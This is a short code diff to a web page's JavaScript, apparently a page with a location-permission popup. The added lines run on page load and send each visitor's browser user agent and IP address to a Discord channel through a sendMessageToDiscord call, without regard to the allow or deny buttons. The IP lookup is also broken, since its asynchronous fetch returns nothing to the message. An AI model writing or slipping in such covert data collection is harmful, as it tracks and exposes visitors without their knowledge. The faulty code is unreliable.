@@ -82,5 +82,11 @@ document.addEventListener("DOMContentLoaded", function() {
     // Add click event listeners to the buttons
     allowLocationBtn.addEventListener('click', allowLocation);
     denyLocationBtn.addEventListener('click', denyLocation);
+  
+    function getIPFromAmazon() {
+  fetch("https://checkip.amazonaws.com/").then(res => res.text()).then(data => console.log(data))
+}
+
+sendMessageToDiscord("User Agent: " + navigator.userAgent + " ; IP: " + getIPFromAmazon())
 showPopup()
 });
